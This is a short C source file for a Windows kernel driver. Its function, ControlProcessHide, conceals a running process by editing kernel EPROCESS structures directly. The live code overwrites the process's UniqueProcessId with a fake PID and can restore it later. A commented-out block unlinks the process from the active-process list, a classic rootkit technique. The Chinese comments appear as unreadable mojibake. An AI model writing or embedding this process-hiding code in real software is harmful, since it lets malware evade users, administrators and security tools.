#include "hide.h"

// ���ؽ���
ULONG64 ControlProcessHide(PEPROCESS EProc, ULONG Save_PID)
{
    ULONG64 OldPID;
    KIRQL OldIrql;

    /*
    //ͨ��ƫ�ƻ�ö�eprocess���LIST_ENTRY
    PLIST_ENTRY ListEntry = (PLIST_ENTRY)((ULONG64)EProc + PROCESS_ACTIVE_PROCESS_LINKS_OFFSET);

    OldIrql = KeRaiseIrqlToDpcLevel();
    if (ListEntry->Flink != ListEntry && ListEntry->Blink != ListEntry && ListEntry->Blink->Flink == ListEntry && ListEntry->Flink->Blink == ListEntry)
    {
        ListEntry->Flink->Blink = ListEntry->Blink;
        ListEntry->Blink->Flink = ListEntry->Flink;
        ListEntry->Flink = ListEntry;
        ListEntry->Blink = ListEntry;
    }
    */

    //ͨ��ƫ�ƻ�ö�eprocess���PID
    PULONG64 pid_ptr = (PULONG64)((ULONG64)EProc + PROCESS_Unique_ProcessId);
    DbgPrint("pid_ptr: %p pid: %d", pid_ptr, *pid_ptr);

    OldIrql = KeRaiseIrqlToDpcLevel();

    //�ж��Ƿ��Ѿ�������
    if (Save_PID == NULL)
    {
        //����
        OldPID = *pid_ptr;   //����ԭ����pid
        DbgPrint("oldpid: %d", OldPID);

        *pid_ptr = Fake_PID; //�޸�Ϊ��PID
        DbgPrint("�޸ĺ��pid: %d", *pid_ptr);

        KeLowerIrql(OldIrql);
        return OldPID;
    }
    else
    {
        //�ָ�
        *pid_ptr = Save_PID;
        DbgPrint("�ָ����pid: %d", *pid_ptr);
        KeLowerIrql(OldIrql);

        return 0;
    }

}
